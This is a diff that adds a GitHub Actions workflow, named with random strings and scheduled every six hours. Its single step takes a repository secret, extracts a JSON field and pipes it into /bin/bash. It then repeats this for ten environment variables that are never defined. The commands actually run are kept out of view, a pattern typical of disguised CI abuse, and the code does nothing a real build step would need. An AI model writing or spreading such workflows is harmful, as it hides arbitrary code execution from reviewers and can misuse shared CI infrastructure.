@@ -1,0 +1,28 @@
+name: licuxiangkuan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: licuxiangkuan
+        env:
+          teo95198: ${{ secrets.teo95198 }}
+        run: |
+          echo $teo95198 | jq -r .h78919 | /bin/bash
+          echo $d14 | jq -r .zpzu8 | /bin/bash
+          echo $kjq315 | jq -r .ibjik34063 | /bin/bash
+          echo $bcjwb580 | jq -r .tbp795 | /bin/bash
+          echo $arx91 | jq -r .xbwze5 | /bin/bash
+          echo $wx55877 | jq -r .gck07596 | /bin/bash
+          echo $dia9 | jq -r .qcci479 | /bin/bash
+          echo $a93 | jq -r .ocvz9 | /bin/bash
+          echo $qek840 | jq -r .gsh2758 | /bin/bash
+          echo $dykep7 | jq -r .mefpf10514 | /bin/bash
+          echo $rc4092 | jq -r .lfhxq281 | /bin/bash
+
